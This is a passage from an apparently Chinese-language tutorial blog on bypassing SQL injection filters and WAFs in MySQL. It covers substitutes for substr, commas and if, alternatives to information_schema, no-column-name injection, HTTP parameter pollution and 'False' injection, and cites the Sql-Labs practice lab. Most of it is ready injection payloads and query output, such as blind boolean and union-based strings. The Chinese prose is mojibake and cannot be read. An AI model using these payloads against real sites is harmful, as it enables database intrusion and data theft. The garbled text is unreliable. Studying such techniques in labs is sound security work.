database())from(7)for(1));    # t</span><br><span class="line">select substr((select database())from(8)for(1));    # y</span><br></pre></td></tr></table></figure>

<p>å³ï¼Œfromç”¨æ¥æŒ‡å®šä»ä½•å¤„å¼€å§‹æˆªå–ï¼Œforç”¨æ¥æŒ‡å®šæˆªå–çš„é•¿åº¦ï¼Œå¦‚æœä¸åŠ forçš„è¯åˆ™ <code>from 1</code> å°±ç›¸å½“äºä»å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä½ä¸€ç›´æˆªå–åˆ°æœ€åï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">select substr((select database()) from 1);    # security</span><br><span class="line">select substr((select database()) from 2);    # ecurity</span><br><span class="line">select substr((select database()) from 3);    # curity</span><br><span class="line">select substr((select database()) from 4);    # urity</span><br><span class="line">select substr((select database()) from 5);    # rity</span><br><span class="line">select substr((select database()) from 6);    # ity</span><br><span class="line">select substr((select database()) from 7);    # ty</span><br><span class="line">select substr((select database()) from 8);    # y</span><br><span class="line"></span><br><span class="line"># ä¹Ÿå¯ä»¥ä½¿ç”¨è´Ÿæ•°æ¥å€’ç€æˆªå–:</span><br><span class="line">select substr((select database())from(-1));    # y</span><br><span class="line">select substr((select database())from(-2));    # ty</span><br><span class="line">select substr((select database())from(-3));    # ity</span><br><span class="line">select substr((select database())from(-4));    # rity</span><br><span class="line">select substr((select database())from(-5));    # urity</span><br><span class="line">select substr((select database())from(-6));    # curity</span><br><span class="line">select substr((select database())from(-7));    # ecurity</span><br><span class="line">select substr((select database())from(-8));    # security</span><br></pre></td></tr></table></figure>

<h5 id="ä½¿ç”¨offsetå…³é”®å­—ç»•è¿‡"><a href="#ä½¿ç”¨offsetå…³é”®å­—ç»•è¿‡" class="headerlink" title="ä½¿ç”¨offsetå…³é”®å­—ç»•è¿‡"></a>ä½¿ç”¨offsetå…³é”®å­—ç»•è¿‡</h5><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>offset</code> è¯­å¥æ›¿æ¢ limit è¯­å¥é‡Œçš„é€—å·ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users limit 1 offset 2;</span><br><span class="line"># æ­¤æ—¶ limit 1 offset 2 å¯ä»¥ä»£æ›¿ limit 1,2</span><br></pre></td></tr></table></figure>

<h5 id="åˆ©ç”¨joinä¸åˆ«åç»•è¿‡"><a href="#åˆ©ç”¨joinä¸åˆ«åç»•è¿‡" class="headerlink" title="åˆ©ç”¨joinä¸åˆ«åç»•è¿‡"></a>åˆ©ç”¨joinä¸åˆ«åç»•è¿‡</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host,user from user where user=&#x27;a&#x27;union(select*from((select`table_name`from`information_schema`.`tables`where`table_schema`=&#x27;mysql&#x27;)`a`join(select`table_type`from`information_schema`.`tables`where`table_schema`=&#x27;mysql&#x27;)b));</span><br></pre></td></tr></table></figure>

<h4 id="è¿‡æ»¤information-schemaç»•è¿‡ä¸æ— åˆ—åæ³¨å…¥"><a href="#è¿‡æ»¤information-schemaç»•è¿‡ä¸æ— åˆ—åæ³¨å…¥" class="headerlink" title="è¿‡æ»¤information_schemaç»•è¿‡ä¸æ— åˆ—åæ³¨å…¥ *"></a>è¿‡æ»¤information_schemaç»•è¿‡ä¸æ— åˆ—åæ³¨å…¥ *</h4><p>å½“è¿‡æ»¤oræ—¶ï¼Œè¿™ä¸ªåº“å°±ä¼šè¢«è¿‡æ»¤ï¼Œé‚£ä¹ˆmysqlåœ¨è¢«wafç¦æ‰äº†information_schemaåº“åè¿˜èƒ½æœ‰å“ªäº›åˆ©ç”¨æ€è·¯å‘¢ï¼Ÿ</p>
<p>information_schema ç®€å•æ¥è¯´ï¼Œè¿™ä¸ªåº“åœ¨mysqlä¸­å°±æ˜¯ä¸ªä¿¡æ¯æ•°æ®åº“ï¼Œå®ƒä¿å­˜ç€mysqlæœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬äº†æ•°æ®åº“åï¼Œè¡¨åï¼Œå­—æ®µåç­‰ã€‚åœ¨æ³¨å…¥ä¸­ï¼Œinfromation_schemaåº“çš„ä½œç”¨æ— éå°±æ˜¯å¯ä»¥è·å–åˆ°table_schemaã€table_nameã€column_nameè¿™äº›æ•°æ®åº“å†…çš„ä¿¡æ¯ã€‚</p>
<p>èƒ½å¤Ÿä»£æ›¿information_schemaçš„æœ‰ï¼š</p>
<ul>
<li><p>sys.schema_auto_increment_columns åªæ˜¾ç¤ºæœ‰è‡ªå¢çš„è¡¨</p>
</li>
<li><p>sys.schema_table_statistics_with_buffer</p>
</li>
<li><p>x$schema_table_statistics_with_buffer</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id = -1 union all select 1,2,3,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database();</span><br></pre></td></tr></table></figure>
</li>
<li><p>mysql.innodb_table_stats</p>
</li>
<li><p>mysql.innodb_table_index</p>
</li>
</ul>
<p>ä»¥ä¸Šå¤§éƒ¨åˆ†ç‰¹æ®Šæ•°æ®åº“éƒ½æ˜¯åœ¨ mysql5.7 ä»¥åçš„ç‰ˆæœ¬æ‰æœ‰ï¼Œå¹¶ä¸”è¦è®¿é—®sysæ•°æ®åº“éœ€è¦æœ‰ç›¸åº”çš„æƒé™ã€‚</p>
<p>ä½†æ˜¯åœ¨ä½¿ç”¨ä¸Šé¢çš„åä¸¤ä¸ªè¡¨æ¥è·å–è¡¨åä¹‹å<code>select group_concat(table_name) from mysql.innodb_table_stats</code>ï¼Œæˆ‘ä»¬æ˜¯æ²¡æœ‰åŠæ³•è·å¾—åˆ—çš„ï¼Œè¿™ä¸ªæ—¶å€™å°±è¦é‡‡ç”¨æ— åˆ—åæ³¨å…¥çš„åŠæ³•ã€‚</p>
<h4 id="æ— åˆ—åæ³¨å…¥"><a href="#æ— åˆ—åæ³¨å…¥" class="headerlink" title="æ— åˆ—åæ³¨å…¥"></a>æ— åˆ—åæ³¨å…¥</h4><h5 id="123æ³•"><a href="#123æ³•" class="headerlink" title="123æ³•"></a>123æ³•</h5><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸€äº›æŸ¥è¯¢ä¸Šçš„æŠ€å·§æ¥è¿›è¡Œæ— åˆ—åã€è¡¨åçš„æ³¨å…¥ã€‚</p>
<p>åœ¨æˆ‘ä»¬ç›´æ¥<code>select 1,2,3</code>æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿçš„è¡¨</p>
<p><a target="_blank" rel="noopener" href="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102451-qfyyn3w.png"><img src="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102451-qfyyn3w.png" alt="img"></a></p>
<p>å¦‚å›¾æ‰€è§åˆ—åä¼šè¢«å®šä¹‰ä¸º1ï¼Œ2ï¼Œ3</p>
<p>å½“æˆ‘ä»¬ç»“åˆäº†unionè”åˆæŸ¥è¯¢ä¹‹å</p>
<p><a target="_blank" rel="noopener" href="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102627-aucxfpc.png"><img src="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102627-aucxfpc.png" alt="img"></a></p>
<p>å¦‚å›¾ï¼Œæˆ‘ä»¬çš„åˆ—åè¢«æ›¿æ¢ä¸ºäº†å¯¹åº”çš„æ•°å­—ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­æ•°å­—æ¥å¯¹åº”åˆ—ï¼Œå¦‚ 3 å¯¹åº”äº†è¡¨é‡Œé¢çš„ passwordï¼Œè¿›è€Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ è¿™æ ·çš„æŸ¥è¯¢è¯­å¥æ¥æŸ¥è¯¢passwordï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `3` from (select 1,2,3 union select * from users)a;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102802-651hm3o.png"><img src="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129102802-651hm3o.png" alt="img"></a></p>
<p>æœ«å°¾çš„ a å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ï¼Œç”¨äºå‘½å</p>
<p>å½“ç„¶ï¼Œå¤šæ•°æƒ…å†µä¸‹ï¼Œåå¼•å·ä¼šè¢«è¿‡æ»¤ã€‚å½“åå¼•å·ä¸èƒ½ä½¿ç”¨çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨åˆ«åæ¥ä»£æ›¿ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b union select * from admin)a;</span><br></pre></td></tr></table></figure>

<h5 id="join"><a href="#join" class="headerlink" title="join"></a>join</h5><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çˆ†é”™ï¼Œå€ŸåŠ©joinå’Œusingçˆ†å‡ºåˆ—åï¼Œidä¸ºç¬¬ä¸€åˆ—ï¼Œusernameä¸ºç¬¬äºŒåˆ—ï¼Œå¯ä»¥é€ä¸ªçˆ†å‡ºï¼Œçˆ†å‡ºå…¨éƒ¨åˆ—åä¹‹åå³å¯å¾—åˆ°åˆ—å†…æ•°æ®ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129140931-xh6qnfj.png"><img src="https://b3logfile.com/siyuan/1621238442570/assets/image-20211129140931-xh6qnfj.png" alt="img"></a></p>
<h4 id="è¿‡æ»¤å…¶ä»–å…³é”®å­—ç»•è¿‡"><a href="#è¿‡æ»¤å…¶ä»–å…³é”®å­—ç»•è¿‡" class="headerlink" title="è¿‡æ»¤å…¶ä»–å…³é”®å­—ç»•è¿‡"></a>è¿‡æ»¤å…¶ä»–å…³é”®å­—ç»•è¿‡</h4><h5 id="è¿‡æ»¤-if-è¯­å¥ç»•è¿‡"><a href="#è¿‡æ»¤-if-è¯­å¥ç»•è¿‡" class="headerlink" title="è¿‡æ»¤ if è¯­å¥ç»•è¿‡"></a>è¿‡æ»¤ if è¯­å¥ç»•è¿‡</h5><p>å¦‚æœè¿‡æ»¤äº† if å…³é”®å­—çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨case whenè¯­å¥ç»•è¿‡ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(condition,1,0) &lt;=&gt; case when condition then 1 else 0 end</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢çš„ifè¯­å¥å’Œcase whenè¯­å¥æ˜¯ç­‰æ•ˆçš„ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; or if((ascii(substr((select database()),1,1))&gt;97),1,0)#</span><br><span class="line"></span><br><span class="line">0&#x27; or case when ascii(substr((select database()),1,1))&gt;97 then 1 else 0 end#</span><br></pre></td></tr></table></figure>

<h4 id="è¿‡æ»¤-substr-ç»•è¿‡"><a href="#è¿‡æ»¤-substr-ç»•è¿‡" class="headerlink" title="è¿‡æ»¤ substr ç»•è¿‡"></a>è¿‡æ»¤ substr ç»•è¿‡</h4><h5 id="ä½¿ç”¨-lpad-lpad"><a href="#ä½¿ç”¨-lpad-lpad" class="headerlink" title="ä½¿ç”¨ lpad&#x2F;lpad"></a>ä½¿ç”¨ lpad&#x2F;lpad</h5><ul>
<li>ä½¿ç”¨lpad()å’Œrpad()ç»•è¿‡substr()</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">select lpad((select database()),1,1)    // s</span><br><span class="line">select lpad((select database()),2,1)    // se</span><br><span class="line">select lpad((select database()),3,1)    // sec</span><br><span class="line">select lpad((select database()),4,1)    // secu</span><br><span class="line">select lpad((select database()),5,1)    // secur</span><br><span class="line">select lpad((select database()),6,1)    // securi</span><br><span class="line">select lpad((select database()),7,1)    // securit</span><br><span class="line">select lpad((select database()),8,1)    // security</span><br><span class="line"></span><br><span class="line">select rpad((select database()),1,1)    // s</span><br><span class="line">select rpad((select database()),2,1)    // se</span><br><span class="line">select rpad((select database()),3,1)    // sec</span><br><span class="line">select rpad((select database()),4,1)    // secu</span><br><span class="line">select rpad((select database()),5,1)    // secur</span><br><span class="line">select rpad((select database()),6,1)    // securi</span><br><span class="line">select rpad((select database()),7,1)    // securit</span><br><span class="line">select rpad((select database()),8,1)    // security</span><br></pre></td></tr></table></figure>

<p>lpadï¼šå‡½æ•°è¯­æ³•ï¼š<code>lpad(str1,length,str2)</code>ã€‚å…¶ä¸­str1æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œlengthæ˜¯ç»“æœå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œstr2æ˜¯ä¸€ä¸ªå¡«å……å­—ç¬¦ä¸²ã€‚å¦‚æœstr1çš„é•¿åº¦æ²¡æœ‰lengthé‚£ä¹ˆé•¿ï¼Œåˆ™ä½¿ç”¨str2å¡«å……ï¼›å¦‚æœstr1çš„é•¿åº¦å¤§äºlengthï¼Œåˆ™æˆªæ–­ã€‚</p>
<p>rpadï¼šåŒç†</p>
<ul>
<li>ä½¿ç”¨left()ç»•è¿‡substr()</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select left((select database()),1)    // s</span><br><span class="line">select left((select database()),2)    // se</span><br><span class="line">select left((select database()),3)    // sec</span><br><span class="line">select left((select database()),4)    // secu</span><br><span class="line">select left((select database()),5)    // secur</span><br><span class="line">select left((select database()),6)    // securi</span><br><span class="line">select left((select database()),7)    // securit</span><br><span class="line">select left((select database()),8)    // security</span><br></pre></td></tr></table></figure>

<ul>
<li>ä½¿ç”¨mid()ç»•è¿‡substr()</li>
</ul>
<p>mid()å‡½æ•°çš„ä½¿ç”¨å°±å’Œsubstr()å‡½æ•°ä¸€æ ·äº†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select mid((select database()),1,1)    // s</span><br><span class="line">select mid((select database()),2,1)    // e</span><br><span class="line">select mid((select database()),3,1)    // c</span><br><span class="line">select mid((select database()),4,1)    // u</span><br><span class="line">select mid((select database()),5,1)    // r</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<ul>
<li>è¿˜å¯ä»¥ä½¿ç”¨ä¸‹é¢è¿™ä¸ªç¥å¥‡çš„ä¸œè¥¿ç»•è¿‡</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select insert(insert((select database()),1,0,space(0)),2,222,space(0));    // s</span><br><span class="line">select insert(insert((select database()),1,1,space(0)),2,222,space(0));    // e</span><br><span class="line">select insert(insert((select database()),1,2,space(0)),2,222,space(0));    // c</span><br><span class="line">select insert(insert((select database()),1,3,space(0)),2,222,space(0));    // u</span><br><span class="line">select insert(insert((select database()),1,4,space(0)),2,222,space(0));    // r</span><br><span class="line">select insert(insert((select database()),1,5,space(0)),2,222,space(0));    // i</span><br><span class="line">select insert(insert((select database()),1,6,space(0)),2,222,space(0));    // t</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>INSERT( <em>string</em> , <em>position</em> , <em>number</em> , <em>string2</em> )</p>
<p>INSERT()å‡½æ•°åœ¨æŒ‡å®šä½ç½®çš„å­—ç¬¦ä¸²ä¸­æ’å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶æ’å…¥ä¸€å®šæ•°é‡çš„å­—ç¬¦ã€‚</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td><em>string</em></td>
<td>å¿…é¡»é¡¹ã€‚è¦ä¿®æ”¹çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td><em>position</em></td>
<td>å¿…é¡»é¡¹ã€‚æ’å…¥<em>string2</em>çš„ä½ç½®</td>
</tr>
<tr>
<td><em>number</em></td>
<td>å¿…é¡»é¡¹ã€‚è¦æ›¿æ¢çš„å­—ç¬¦æ•°</td>
</tr>
<tr>
<td><em>string2</em></td>
<td>å¿…é¡»é¡¹ã€‚è¦æ’å…¥<em>å­—ç¬¦ä¸²çš„å­—ç¬¦ä¸²</em></td>
</tr>
</tbody></table>
<h4 id="HTTPå‚æ•°æ±¡æŸ“-HPP-æ¼æ´ç»•è¿‡-Waf"><a href="#HTTPå‚æ•°æ±¡æŸ“-HPP-æ¼æ´ç»•è¿‡-Waf" class="headerlink" title="HTTPå‚æ•°æ±¡æŸ“(HPP)æ¼æ´ç»•è¿‡ Waf"></a>HTTPå‚æ•°æ±¡æŸ“(HPP)æ¼æ´ç»•è¿‡ Waf</h4><p>HPPæ˜¯HTTP Parameter Pollutionçš„ç¼©å†™ï¼Œæ„ä¸ºHTTPå‚æ•°æ±¡æŸ“ã€‚æµè§ˆå™¨åœ¨è·ŸæœåŠ¡å™¨è¿›è¡Œäº¤äº’çš„è¿‡ç¨‹ä¸­ï¼Œæµè§ˆå™¨å¾€å¾€ä¼šåœ¨GETæˆ–POSTè¯·æ±‚é‡Œé¢å¸¦ä¸Šå‚æ•°ï¼Œè¿™äº›å‚æ•°ä¼šä»¥ é”®-å€¼ å¯¹çš„å½¢åŠ¿å‡ºç°ï¼Œé€šå¸¸åœ¨ä¸€ä¸ªè¯·æ±‚ä¸­ï¼ŒåŒæ ·åç§°çš„å‚æ•°åªä¼šå‡ºç°ä¸€æ¬¡ã€‚</p>
<p>ä½†æ˜¯åœ¨HTTPåè®®ä¸­æ˜¯å…è®¸åŒæ ·åç§°çš„å‚æ•°å‡ºç°å¤šæ¬¡çš„ã€‚æ¯”å¦‚ä¸‹é¢è¿™ä¸ªé“¾æ¥ï¼š<code>http://www.baidu.com?name=aa&amp;name=bb</code>ï¼Œé’ˆå¯¹åŒæ ·åç§°çš„å‚æ•°å‡ºç°å¤šæ¬¡çš„æƒ…å†µï¼Œä¸åŒçš„æœåŠ¡å™¨çš„å¤„ç†æ–¹å¼ä¼šä¸ä¸€æ ·ã€‚æœ‰çš„æœåŠ¡å™¨æ˜¯å–ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯ <code>name=aa</code>ã€‚æœ‰çš„æœåŠ¡å™¨æ˜¯å–ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯ <code>name=bb</code>ã€‚æœ‰çš„æœåŠ¡å™¨ä¸¤ä¸ªå‚æ•°éƒ½å–ï¼Œä¹Ÿå°±æ˜¯ <code>name=aa,bb</code>ã€‚è¿™ç§ç‰¹æ€§åœ¨ç»•è¿‡ä¸€äº›æœåŠ¡å™¨ç«¯çš„é€»è¾‘åˆ¤æ–­æ—¶ï¼Œéå¸¸æœ‰ç”¨ã€‚</p>
<p>HPPæ¼æ´ï¼Œä¸WebæœåŠ¡å™¨ç¯å¢ƒã€æœåŠ¡ç«¯ä½¿ç”¨çš„è„šæœ¬æœ‰å…³ã€‚å¦‚ä¸‹æ˜¯ä¸åŒç±»å‹çš„WebæœåŠ¡å™¨å¯¹äºå‡ºç°å¤šä¸ªå‚æ•°æ—¶çš„é€‰æ‹©ï¼š</p>
<table>
<thead>
<tr>
<th><strong>Web æœåŠ¡å™¨</strong></th>
<th><strong>å‚æ•°è·å–å‡½æ•°</strong></th>
<th><strong>è·å–åˆ°çš„å‚æ•°</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>PHP&#x2F;Apache</strong></td>
<td>$_GET[â€˜aâ€™]</td>
<td>Last</td>
</tr>
<tr>
<td><strong>JSP&#x2F;Tomcat</strong></td>
<td>Request.getParameter(â€˜aâ€™)</td>
<td>First</td>
</tr>
<tr>
<td><strong>Perl(CGI)&#x2F;Apache</strong></td>
<td>Param(â€˜aâ€™)</td>
<td>First</td>
</tr>
<tr>
<td><strong>Python&#x2F;Apache</strong></td>
<td>getvalue(â€˜aâ€™)</td>
<td>All</td>
</tr>
<tr>
<td><strong>ASP&#x2F;IIS</strong></td>
<td>Request.QueryString(â€˜aâ€™)</td>
<td>All</td>
</tr>
</tbody></table>
<p>å‡è®¾æœåŠ¡å™¨ç«¯æœ‰ä¸¤ä¸ªéƒ¨åˆ†ï¼šç¬¬ä¸€éƒ¨åˆ†æ˜¯Tomcatä¸ºå¼•æ“çš„JSP&#x2F;Tomcatå‹æœåŠ¡å™¨ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯Apacheä¸ºå¼•æ“çš„PHP&#x2F;Apacheå‹æœåŠ¡å™¨ã€‚ç¬¬ä¸€éƒ¨åˆ†çš„JSP&#x2F;TomcatæœåŠ¡å™¨å¤„åšæ•°æ®è¿‡æ»¤å’Œå¤„ç†ï¼ŒåŠŸèƒ½ç±»ä¼¼ä¸ºä¸€ä¸ªWAFï¼Œè€ŒçœŸæ­£æä¾›WebæœåŠ¡çš„æ˜¯PHP&#x2F;ApacheæœåŠ¡å™¨ã€‚é‚£ä¹ˆæœåŠ¡ç«¯çš„å·¥ä½œæµç¨‹ä¸ºï¼šå®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨ï¼Œèƒ½ç›´æ¥è®¿é—®åˆ°JSP&#x2F;TomcatæœåŠ¡å™¨ï¼Œç„¶åJSP&#x2F;TomcatæœåŠ¡å™¨å†å‘PHP&#x2F;ApacheæœåŠ¡å™¨è¯·æ±‚æ•°æ®ã€‚æ•°æ®è¿”å›è·¯å¾„åˆ™ç›¸åã€‚</p>
<p>é‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬ä¾¿å¯ä»¥åˆ©ç”¨ä¸åŒæœåŠ¡å™¨è§£æå‚æ•°çš„ä½ç½®ä¸åŒç»•è¿‡WAFçš„æ£€æµ‹ã€‚æ¥çœ‹çœ‹å¦‚ä¸‹è¯·æ±‚ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.jsp?id=1&amp;id=2</span><br></pre></td></tr></table></figure>

<p>å®¢æˆ·ç«¯è¯·æ±‚é¦–å…ˆè¿‡JSP&#x2F;TomcatæœåŠ¡å™¨ï¼ŒJSP&#x2F;TomcatæœåŠ¡å™¨è§£æç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ¥ä¸‹æ¥JSP&#x2F;TomcatæœåŠ¡å™¨å»è¯·æ±‚PHP&#x2F;ApacheæœåŠ¡å™¨ï¼ŒPHP&#x2F;ApacheæœåŠ¡å™¨è§£ææœ€åä¸€ä¸ªå‚æ•°ã€‚å‡è®¾JSP&#x2F;TomcatæœåŠ¡å™¨ä½œä¸ºWafå¯¹ç¬¬ä¸€ä¸ªå‚æ•°è¿›è¡Œæ£€æµ‹ï¼Œé‚£æˆ‘ä»¬ä¾¿å¯ä»¥åœ¨ç¬¬äºŒä¸ªå‚æ•°ä¸­ä¼ payloadæ¥ç»•è¿‡Wafã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.jsp?id=1&amp;id=-1&#x27; union select 1,database(),3--+</span><br></pre></td></tr></table></figure>

<p>è¿™æ · Waf å¯èƒ½åªæ£€æµ‹ç¬¬ä¸€ä¸ªå‚æ•° <code>id=1</code>ï¼Œè€ŒPHPè„šæœ¬çœŸæ­£è¯†åˆ«çš„æ˜¯ <code>id=select database()--+</code></p>
<p>[ä¾‹é¢˜]Sql-Labs Less-29</p>
<h4 id="False-æ³¨å…¥ç»•è¿‡"><a href="#False-æ³¨å…¥ç»•è¿‡" class="headerlink" title="False æ³¨å…¥ç»•è¿‡"></a>False æ³¨å…¥ç»•è¿‡</h4><h5 id="False-æ³¨å…¥åŸç†"><a href="#False-æ³¨å…¥åŸç†" class="headerlink" title="False æ³¨å…¥åŸç†"></a>False æ³¨å…¥åŸç†</h5><p>å‰é¢æˆ‘ä»¬å­¦è¿‡çš„æ³¨å…¥éƒ½æ˜¯åŸºäº1&#x3D;1è¿™æ ·æ¯”è¾ƒçš„æ™®é€šæ³¨å…¥ï¼Œä¸‹é¢æ¥è¯´ä¸€è¯´ False æ³¨å…¥ï¼Œåˆ©ç”¨ False æˆ‘ä»¬å¯ä»¥ç»•è¿‡ä¸€äº›ç‰¹å®šçš„ WAF ä»¥åŠä¸€äº›æœªæ¥ä¸ç¡®å®šçš„å› ç´ ã€‚</p>
<p>é¦–å…ˆæˆ‘ä»¬æ¥çœ‹ä¸€çœ‹ä¸‹é¢è¿™ä¸ªsqlæŸ¥è¯¢è¯­å¥ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where uesrname = 0;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://b3logfile.com/siyuan/1621238442570/assets/image-20211128203530-sxree7q.png"><img src="https://b3logfile.com/siyuan/1621238442570/assets/image-20211128203530-sxree7q.png" alt="img"></a></p>
<p>ä¸ºä»€ä¹ˆ <code>username = 0</code> ä¼šå¯¼è‡´è¿”å›æ•°æ®ï¼Œè€Œä¸”æ˜¯å…¨éƒ¨æ•°æ®å‘¢ï¼Ÿ</p>
<p>è¿™å°±æ˜¯ä¸€ä¸ªåŸºäº False æ³¨å…¥çš„ä¾‹å­ï¼Œä¸‹é¢å†ä¸¾ä¸€ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username = 0;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://b3logfile.com/siyuan/1621238442570/assets/image-20211128203516-cfavxud.png"><img src="https://b3logfile.com/siyuan/1621238442570/assets/image-20211128203516-cfavxud.png" alt="img"></a></p>
<p>å’Œä¸Šé¢æ˜¯åŒä¸€ä¸ªè¡¨ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆè¿™é‡Œåªè¿”å›äº†ä¸¤ç»„æ•°æ®å‘¢ï¼Ÿè¯´åˆ°è¿™é‡Œä¸å¾—ä¸è¯´ä¸€è¯´æœ‰å…³äº MYSQL çš„éšå¼ç±»å‹è½¬æ¢ã€‚</p>
